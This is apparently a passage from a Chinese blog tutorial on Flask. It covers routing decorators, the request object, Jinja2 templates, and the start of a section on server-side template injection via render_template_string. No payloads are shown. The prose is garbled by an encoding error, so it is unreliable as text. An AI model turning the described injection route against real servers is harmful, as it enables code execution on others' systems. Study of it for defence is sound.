<li>è§†å›¾å‡½æ•°çš„è¿”å›å€¼ä¼šä½œä¸º <strong>HTTP å“åº”</strong> å‘å›ç»™ç”¨æˆ·ï¼ˆå­—ç¬¦ä¸²ã€HTMLã€JSON ç­‰éƒ½è¡Œï¼‰ã€‚</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hello&quot;</span></span>)  </span><span class="comment"># è·¯ç”±ï¼šè®¿é—® /hello æ—¶æ‰§è¡Œ hello()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():          <span class="comment"># è¿™ä¸ªå‡½æ•°å°±æ˜¯ä¸€ä¸ªè§†å›¾å‡½æ•°</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello, Flask!&quot;</span>  <span class="comment"># è¿”å›çš„å†…å®¹å°±æ˜¯ HTTP å“åº”</span></span><br></pre></td></tr></table></figure></div>

<h3 id="è·¯ç”±ï¼ˆRoutingï¼‰"><a href="#è·¯ç”±ï¼ˆRoutingï¼‰" class="headerlink" title="è·¯ç”±ï¼ˆRoutingï¼‰"></a>è·¯ç”±ï¼ˆRoutingï¼‰</h3><p>è·¯ç”±æ˜¯ <strong>URL ä¸å¤„ç†å‡½æ•°ï¼ˆè§†å›¾å‡½æ•°ï¼‰ä¹‹é—´çš„æ˜ å°„è§„åˆ™</strong>ã€‚å½“ç”¨æˆ·è®¿é—®æŸä¸ª URL æ—¶ï¼ŒFlask ä¼šæ ¹æ®è·¯ç”±è§„åˆ™æ‰¾åˆ°å¯¹åº”çš„å‡½æ•°å¹¶æ‰§è¡Œï¼Œå°†è¿”å›å€¼ä½œä¸º HTTP å“åº”å‘é€ç»™å®¢æˆ·ç«¯ã€‚</p>
<p>å…¶ä¸­æ³¨å†Œè·¯ç”±è¦ç”¨åˆ° <code>route</code> è£…é¥°å™¨ã€‚å…¶ä¸­ <code>@app.route</code> è¦è·Ÿå‰é¢çš„ <code>app</code> è¦è·Ÿ<code>app = Flask(__name__)</code> æ—¶çš„ <code>app</code> å˜é‡åä¸€ç›´ï¼Œè¿™æ˜¯å› ä¸º <code>app</code> ä¼šä½œä¸º <code>self</code> ä¼ å…¥ <code>route</code> å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)  </span><span class="comment"># å½“è®¿é—® /hello æ—¶æ‰§è¡Œ hello()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello, Flask!&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œ <code>@app.route</code> æ˜¯ä¸€ä¸ªè£…é¥°å™¨ã€‚è£…é¥°å™¨ï¼ˆ<code>@xxx</code>ï¼‰åªæ˜¯ <strong>åœ¨å®šä¹‰å‡½æ•°çš„æ—¶å€™ï¼Œå…ˆæŠŠè¿™ä¸ªå‡½æ•°äº¤ç»™å¦ä¸€ä¸ªå‡½æ•°å¤„ç†</strong>ã€‚å› æ­¤ä¸Šé¢è¿™ä¸ªå‡½æ•°ç­‰ä»·äºï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello, Flask!&quot;</span></span><br><span class="line"></span><br><span class="line">index = app.route(<span class="string">&quot;/&quot;</span>)(index)   <span class="comment"># æ³¨æ„æ˜¯ä¸¤å±‚è°ƒç”¨</span></span><br></pre></td></tr></table></figure></div>

<p>æ‰€ä»¥ <code>@app.route(&quot;/&quot;)</code> åªæ˜¯æŠŠä½ çš„ <code>index</code> å‡½æ•°åŒ…äº†ä¸€ä¸‹ï¼Œå¹¶åœ¨åŒ…çš„è¿‡ç¨‹ä¸­åšäº†â€œæ³¨å†Œè·¯ç”±â€çš„äº‹ã€‚</p>
<p>è£…é¥°å™¨å‡½æ•° <code>route</code> å®šä¹‰å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°è¿”å›äº†ä¸€ä¸ª <code>decorator</code> å‡½æ•°æ¥æ³¨å†Œ <code>index</code> å‡½æ•°çš„è·¯ç”±ï¼Œè€Œ  <code>decorator</code> å‡½æ•°æœ€ç»ˆæ˜¯è°ƒç”¨ <code>add_url_rule</code> å‡½æ•°æ¥æ·»åŠ è·¯ç”±çš„ã€‚</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">route</span>(<span class="params">self, rule: <span class="built_in">str</span>, **options: t.<span class="type">Any</span></span>) -&gt; t.<span class="type">Callable</span>[[T_route], T_route]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    è£…é¥°ä¸€ä¸ªè§†å›¾å‡½æ•°ï¼ˆview functionï¼‰ï¼Œ</span></span><br><span class="line"><span class="string">    æ ¹æ®æŒ‡å®šçš„ URL è§„åˆ™å’Œå‚æ•°å°†å…¶æ³¨å†Œåˆ°åº”ç”¨ä¸­ã€‚</span></span><br><span class="line"><span class="string">    æœ¬æ–¹æ³•ä¼šè°ƒç”¨ :meth:`add_url_rule`ï¼Œè¯¥æ–¹æ³•ä¸­æœ‰æ›´å¤šå®ç°ç»†èŠ‚ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. code-block:: python</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="string">        def index():</span></span><br><span class="line"><span class="string">            return &quot;Hello, World!&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    å‚è§ :ref:`url-route-registrations`ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    å¦‚æœæ²¡æœ‰ä¼ å…¥ ``endpoint`` å‚æ•°ï¼Œåˆ™è·¯ç”±çš„ç«¯ç‚¹åç§°</span></span><br><span class="line"><span class="string">    é»˜è®¤ä¸ºè§†å›¾å‡½æ•°çš„å‡½æ•°åã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ``methods`` å‚æ•°é»˜è®¤å€¼ä¸º ``[&quot;GET&quot;]``ï¼Œ</span></span><br><span class="line"><span class="string">    è€Œ ``HEAD`` å’Œ ``OPTIONS`` æ–¹æ³•ä¼šè‡ªåŠ¨æ·»åŠ ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param rule: URL è§„åˆ™å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="string">    :param options: ä¼ é€’ç»™ :class:`~werkzeug.routing.Rule` å¯¹è±¡çš„é¢å¤–é€‰é¡¹ã€‚</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">f: T_route</span>) -&gt; T_route:</span><br><span class="line">        endpoint = options.pop(<span class="string">&quot;endpoint&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="comment"># ğŸ“Œ è°ƒç”¨ add_url_rule æ·»åŠ è·¯ç”±</span></span><br><span class="line">        <span class="comment"># è¿™é‡Œ self å°±æ˜¯ Flask å®ä¾‹åŒ–çš„å¯¹è±¡ app</span></span><br><span class="line">        <span class="variable language_">self</span>.add_url_rule(rule, endpoint, f, **options)</span><br><span class="line">        <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decorator</span><br></pre></td></tr></table></figure></div>

<p>å¹¶ä¸”å¯ä»¥çœ‹åˆ° <code>decorator</code> æ·»åŠ å®Œè·¯ç”±åä¼šè¿”å›ä¼ å…¥çš„å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ä»£ç ä¸­çš„ <code>index = app.route(&quot;/&quot;)(index)</code> å¹¶æ²¡æœ‰æ”¹å˜ <code>index</code> å‡½æ•°æœ¬èº«ã€‚</p>
<p>è€Œä¹‹åç”¨æˆ·è®¿é—®ç½‘é¡µçš„ <code>/</code> è·¯å¾„æ—¶ï¼ŒFlask ä¼šç›´æ¥è°ƒç”¨æ³¨å†Œçš„ <code>index</code> å‡½æ•°ï¼Œå› æ­¤å’Œè¿™é‡Œæ³¨å†Œè·¯ç”±çš„é€»è¾‘å·²ç»æ²¡æœ‰å…³ç³»é“¾ã€‚</p>
<p>é»˜è®¤è·¯ç”±åªå“åº” <code>GET</code> è¯·æ±‚ï¼Œå¦‚æœæƒ³è®©å®ƒå“åº”å…¶ä»–æ–¹æ³•ï¼Œå¯ä»¥è¿™æ ·ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/submit&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;è¡¨å•å·²æäº¤&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>Flask 2.0+ åŠ å…¥äº†æ›´ç®€æ´çš„ <strong>HTTP æ–¹æ³•å¿«æ·è£…é¥°å™¨</strong>ã€‚æ¯”å¦‚ <code>@app.get()</code>ã€<code>@app.post()</code>ã€<code>@app.put()</code>ã€<code>@app.delete()</code> ç­‰ï¼Œä½œç”¨å’Œ <code>@app.route(..., methods=[&quot;XXX&quot;])</code> ç­‰ä»·ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/info&quot;</span></span>)       </span><span class="comment"># ç­‰ä»·äº @app.route(&quot;/info&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_info</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;GET è¯·æ±‚&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/upload&quot;</span></span>)    </span><span class="comment"># ç­‰ä»·äº @app.route(&quot;/upload&quot;, methods=[&quot;POST&quot;])</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;POST è¯·æ±‚&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>Flask  è¿˜æ”¯æŒåœ¨è·¯ç”±ä¸­ä½¿ç”¨å ä½ç¬¦ï¼Œè®©è·¯å¾„çš„ä¸€éƒ¨åˆ†å˜æˆå˜é‡ã€‚è¿™ç§ç‰¹æ€§ç§°ä¸º<strong>åŠ¨æ€è·¯ç”±å‚æ•°</strong>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/user/&lt;name&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;ä½ å¥½ï¼Œ<span class="subst">&#123;name&#125;</span>ï¼&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/post/&lt;int:post_id&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">post_id</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;æ–‡ç«  ID: <span class="subst">&#123;post_id&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="è¯·æ±‚å¯¹è±¡ï¼ˆRequestï¼‰"><a href="#è¯·æ±‚å¯¹è±¡ï¼ˆRequestï¼‰" class="headerlink" title="è¯·æ±‚å¯¹è±¡ï¼ˆRequestï¼‰"></a>è¯·æ±‚å¯¹è±¡ï¼ˆRequestï¼‰</h3><p><strong>è¯·æ±‚å¯¹è±¡ï¼ˆ<code>request</code>ï¼‰</strong> å°±æ˜¯ Flask ç”¨æ¥è¡¨ç¤º <strong>å®¢æˆ·ç«¯å‘è¿‡æ¥çš„ HTTP è¯·æ±‚</strong> çš„ä¸€ä¸ªå·¥å…·ï¼Œå®ƒå¸®ä½ è¯»å–ç”¨æˆ·å‘æ¥çš„å„ç§æ•°æ®ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li><strong>URL æŸ¥è¯¢å‚æ•°</strong>ï¼ˆ?q&#x3D;xxxï¼‰</li>
<li><strong>è¡¨å•æäº¤çš„æ•°æ®</strong>ï¼ˆPOST è¡¨å•ï¼‰</li>
<li><strong>JSON æ•°æ®</strong>ï¼ˆPOST JSONï¼‰</li>
<li><strong>è¯·æ±‚å¤´ä¿¡æ¯</strong>ï¼ˆæµè§ˆå™¨&#x2F;å®¢æˆ·ç«¯å‘çš„ Headerï¼‰</li>
<li><strong>Cookie</strong> ç­‰</li>
</ul>
<p>åœ¨ Flask é‡Œï¼Œ<code>request</code> æ˜¯ä» <code>flask</code> åŒ…ä¸­å¯¼å…¥çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br></pre></td></tr></table></figure></div>

<p>å®ƒçš„å¸¸ç”¨å±æ€§å’Œæ–¹æ³•ï¼š</p>
<ul>
<li><code>request.args</code> â†’ <strong>GET æŸ¥è¯¢å‚æ•°</strong>ï¼ˆå­—å…¸å½¢å¼ï¼‰</li>
<li><code>request.form</code> â†’ <strong>POST è¡¨å•å­—æ®µ</strong></li>
<li><code>request.json</code> â†’ <strong>POST JSON æ•°æ®</strong></li>
<li><code>request.headers</code> â†’ <strong>è¯·æ±‚å¤´</strong></li>
<li><code>request.method</code> â†’ è¯·æ±‚æ–¹å¼ï¼ˆGET&#x2F;POST&#x2F;PUT&#x2F;DELETEï¼‰</li>
<li><code>request.cookies</code> â†’ è¯·æ±‚é™„å¸¦çš„ Cookie</li>
</ul>
<h3 id="å“åº”ï¼ˆResponseï¼‰"><a href="#å“åº”ï¼ˆResponseï¼‰" class="headerlink" title="å“åº”ï¼ˆResponseï¼‰"></a>å“åº”ï¼ˆResponseï¼‰</h3><p><strong>å“åº”</strong> æ˜¯ Flask <strong>è¿”å›ç»™å®¢æˆ·ç«¯çš„ HTTP æ•°æ®</strong>ï¼Œä¸€èˆ¬æ˜¯ä½ åœ¨è§†å›¾å‡½æ•°é‡Œ <code>return</code> å‡ºå»çš„ä¸œè¥¿ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>è¿”å›ä¸€ä¸ª <strong>å­—ç¬¦ä¸²</strong> â†’ æµè§ˆå™¨ç›´æ¥æ˜¾ç¤º</li>
<li>è¿”å› <strong>HTML æ¨¡æ¿</strong> â†’ æ˜¾ç¤ºç½‘é¡µ</li>
<li>è¿”å› <strong>JSON</strong> â†’ ç”¨äº API</li>
<li>è¿”å› <strong>çŠ¶æ€ç </strong>ï¼ˆ200, 404, 500 ç­‰ï¼‰</li>
</ul>
<h3 id="æ¨¡æ¿ï¼ˆTemplateï¼‰"><a href="#æ¨¡æ¿ï¼ˆTemplateï¼‰" class="headerlink" title="æ¨¡æ¿ï¼ˆTemplateï¼‰"></a>æ¨¡æ¿ï¼ˆTemplateï¼‰</h3><p>æ¨¡æ¿ç”¨äºå°†åŠ¨æ€æ•°æ®ä¸ HTML ç»“æ„ç»“åˆã€‚Flask é»˜è®¤ä½¿ç”¨ Jinja2 æ¨¡æ¿å¼•æ“ã€‚</p>
<p>ä¾‹å¦‚ä¸‹é¢è¿™æ®µä»£ç ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, name=name)</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>è§†å›¾å‡½æ•°è°ƒç”¨ <code>render_template()</code>ï¼ŒæŒ‡å®šæ¨¡æ¿æ–‡ä»¶å <code>index.html</code> å¹¶ä¼ å…¥æ•°æ®å˜é‡ <code>name</code>ã€‚</p>
</li>
<li><p>Flask ä¼šå» <strong><code>templates/</code> ç›®å½•</strong> æ‰¾å¯¹åº”çš„ HTML æ¨¡æ¿æ–‡ä»¶ <code>index.html</code>ï¼ˆé»˜è®¤è·¯å¾„ï¼Œå¯ä¿®æ”¹ï¼‰ã€‚</p>
<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123; name &#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>Jinja2 ä¼šæŠŠæ¨¡æ¿æ–‡ä»¶ä¸­çš„å ä½ç¬¦ï¼ˆ<code>&#123;&#123; å˜é‡ &#125;&#125;</code>ï¼‰æ›¿æ¢æˆä¼ å…¥çš„å®é™…æ•°æ®ã€‚</p>
</li>
<li><p>æ¸²æŸ“å¥½çš„ HTML è¿”å›ç»™æµè§ˆå™¨æ˜¾ç¤ºã€‚</p>
</li>
</ol>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="ä½¿ç”¨å±é™©æ¨¡æ¿æ¸²æŸ“å‡½æ•°"><a href="#ä½¿ç”¨å±é™©æ¨¡æ¿æ¸²æŸ“å‡½æ•°" class="headerlink" title="ä½¿ç”¨å±é™©æ¨¡æ¿æ¸²æŸ“å‡½æ•°"></a>ä½¿ç”¨å±é™©æ¨¡æ¿æ¸²æŸ“å‡½æ•°</h3><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p> <strong>SSTIï¼ˆServer-Side Template Injectionï¼‰</strong>æŒ‡çš„æ˜¯å½“ <strong>ç”¨æˆ·å¯æ§çš„å­—ç¬¦ä¸²</strong> è¢«å½“æˆ <strong>æ¨¡æ¿</strong> äº¤ç»™æ¨¡æ¿å¼•æ“ï¼ˆè¿™é‡Œæ˜¯ Jinja2ï¼‰è§£ææ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ¨¡æ¿è¯­æ³•é‡Œå†™è¡¨è¾¾å¼ï¼Œè®©åç«¯æ‰§è¡Œå®ƒï¼Œä»â€œå›æ˜¾æ³¨å…¥â€é€æ­¥å‡çº§åˆ°â€œè¯»ä¸Šä¸‹æ–‡å¯¹è±¡ â†’ è°ƒç”¨å‡½æ•° â†’ ä»£ç æ‰§è¡Œâ€ã€‚</p>
<h3 id="Flask-æ¨¡æ¿æ”¯æŒ"><a href="#Flask-æ¨¡æ¿æ”¯æŒ" class="headerlink" title="Flask æ¨¡æ¿æ”¯æŒ"></a>Flask æ¨¡æ¿æ”¯æŒ</h3><p>Flask é»˜è®¤ä½¿ç”¨ <strong>Jinja2</strong> æ¨¡æ¿å¼•æ“ï¼ˆä½œè€…ä¹Ÿæ˜¯ Flask ä½œè€… Armin Ronacherï¼‰,å¹¶æä¾›äº† <code>render_template_string</code> å’Œ <code>render_template</code> ä¸¤ä¸ªæ¨¡æ¿æ¸²æŸ“çš„å‡½æ•°ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">render_template_string</span>(<span class="params">source: <span class="built_in">str</span>, **context: t.<span class="type">Any</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    æ¸²æŸ“æ¨¡æ¿æºå­—ç¬¦ä¸²ï¼ˆç›´æ¥ä¼ å…¥æ¨¡æ¿å†…å®¹ï¼‰å¹¶è¿”å›æ¸²æŸ“åçš„å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    âš ï¸ é«˜å±ï¼šå¦‚æœ `source` å«æœ‰ç”¨æˆ·å¯æ§å†…å®¹ï¼Œä¼šè§¦å‘ SSTIï¼ˆæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼‰é£é™©ã€‚</span></span><br><span class="line"><span class="string">             ä¸€èˆ¬ä»…åœ¨æ¨¡æ¿å†…å®¹æ˜¯å—ä¿¡ä»»çš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    åŠŸèƒ½ï¼š</span></span><br><span class="line"><span class="string">        - å°†ä¼ å…¥çš„ Jinja2 æ¨¡æ¿å­—ç¬¦ä¸² `source` ç¼–è¯‘å¹¶æ¸²æŸ“ã€‚</span></span><br><span class="line"><span class="string">        - è‡ªåŠ¨è¿›è¡Œ HTML è½¬ä¹‰ï¼ˆautoescapeï¼‰ï¼Œé˜²æ­¢ HTML æ³¨å…¥ã€‚</span></span><br><span class="line"><span class="string">        - åœ¨æ¸²æŸ“æ—¶æ³¨å…¥ `**context` ä¸­çš„å˜é‡ä½œä¸ºæ¨¡æ¿ä¸Šä¸‹æ–‡ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    å‚æ•°ï¼š</span></span><br><span class="line"><span class="string">        source (str):</span></span><br><span class="line"><span class="string">            - æ¨¡æ¿æºä»£ç ï¼ˆJinja2 è¯­æ³•å­—ç¬¦ä¸²ï¼‰ã€‚</span></span><br><span class="line"><span class="string">            - ä¾‹å¦‚ï¼š`&quot;Hello &#123;&#123; name &#125;&#125;&quot;`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        **context (Any):</span></span><br><span class="line"><span class="string">            - æ¨¡æ¿å˜é‡ä¸Šä¸‹æ–‡ï¼Œé”®å€¼å¯¹å½¢å¼ä¼ å…¥ã€‚</span></span><br><span class="line"><span class="string">            - ä¾‹å¦‚ï¼š`name=&quot;Alice&quot;, age=20`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    è¿”å›å€¼ï¼š</span></span><br><span class="line"><span class="string">        str:</span></span><br><span class="line"><span class="string">            - æ¸²æŸ“åçš„å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="string">            - æ‰€æœ‰æ¨¡æ¿è¯­æ³•å·²è¢«è§£æã€å˜é‡æ›¿æ¢å®Œæˆã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ç¤ºä¾‹ï¼š</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; render_template_string(&quot;Hello &#123;&#123; name &#125;&#125;&quot;, name=&quot;Alice&quot;)</span></span><br><span class="line"><span class="string">        &#x27;Hello Alice&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    æ³¨æ„ï¼š</span></span><br><span class="line"><span class="string">        - ä¸ä»ç£ç›˜è¯»å–æ¨¡æ¿æ–‡ä»¶ï¼Œåªæ¸²æŸ“å†…å­˜ä¸­çš„æ¨¡æ¿å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="string">        - ç”¨äºåŠ¨æ€ç”Ÿæˆæ¨¡æ¿æ—¶è¦ç¡®ä¿ `source` å†…å®¹å¯ä¿¡ã€‚</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>(<span class="params"></span></span><br><span class="line"><span class="params">    template_name_or_list: t.<span class="type">Union</span>[<span class="built_in">str</span>, Template, t.<span class="type">List</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, Template]]],</span></span><br><span class="line"><span class="params">    **context: t.<span class="type">Any</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    æ¸²æŸ“æ¨¡æ¿ç›®å½•ä¸­çš„æ¨¡æ¿æ–‡ä»¶ï¼Œå¹¶è¿”å›æ¸²æŸ“åçš„å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    åŠŸèƒ½ï¼š</span></span><br><span class="line"><span class="string">        - ä» Flask é…ç½®çš„æ¨¡æ¿ç›®å½•ï¼ˆé»˜è®¤ `templates/`ï¼‰ä¸­åŠ è½½æ¨¡æ¿æ–‡ä»¶ã€‚</span></span><br><span class="line"><span class="string">        - å¦‚æœä¼ å…¥çš„æ˜¯æ¨¡æ¿åç§°åˆ—è¡¨ï¼Œä¼šæŒ‰é¡ºåºæŸ¥æ‰¾ç¬¬ä¸€ä¸ªå­˜åœ¨çš„æ¨¡æ¿å¹¶æ¸²æŸ“ã€‚</span></span><br><span class="line"><span class="string">        - 